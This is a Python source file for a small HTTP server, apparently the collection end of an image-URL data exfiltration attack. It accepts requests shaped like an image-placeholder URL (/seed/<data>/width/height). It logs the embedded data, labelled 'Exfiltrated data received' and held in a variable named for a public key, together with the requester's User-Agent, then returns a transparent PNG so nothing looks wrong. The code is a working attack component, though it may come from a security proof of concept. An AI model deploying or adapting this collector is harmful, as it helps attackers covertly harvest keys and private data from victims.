from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote
import time

class ExfilImageServer(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Parse URL path (e.g., /seed/data/500/300)
            parts = unquote(self.path).split('/')
            
            # Handle requests to root path
            if self.path == '/':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'Server is running. Use /seed/[data]/width/height')
                return
                
            # Process image requests
            if len(parts) >= 4 and parts[1] == 'seed':
                cle_pub = parts[2]
                width = parts[3] if len(parts) > 3 else "500"
                height = parts[4] if len(parts) > 4 else "300"
                
                # Log the exfiltrated data
                print(f"\n[!] Exfiltrated data received:")
                print(f"    Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"    Data: {cle_pub}")
                print(f"    Dimensions: {width}x{height}")
                print(f"    User-Agent: {self.headers.get('User-Agent')}")
                
                # Return a transparent 1x1 PNG
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
                return
                
            # Handle invalid paths
            self.send_error(404, "Not Found - Use /seed/[data]/width/height")
            
        except Exception as e:
            print(f"Error handling request: {str(e)}")
            self.send_error(500, "Internal Server Error")

def run_server(port=8080):
    server_address = ('127.0.0.1', port)
    httpd = HTTPServer(server_address, ExfilImageServer)
    print(f"[*] Server running on http://127.0.0.1:{port}")
    # print(f"[*] Valid URL format: http://127.0.0.1:{port}/seed/YOUR_DATA/500/300")::
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()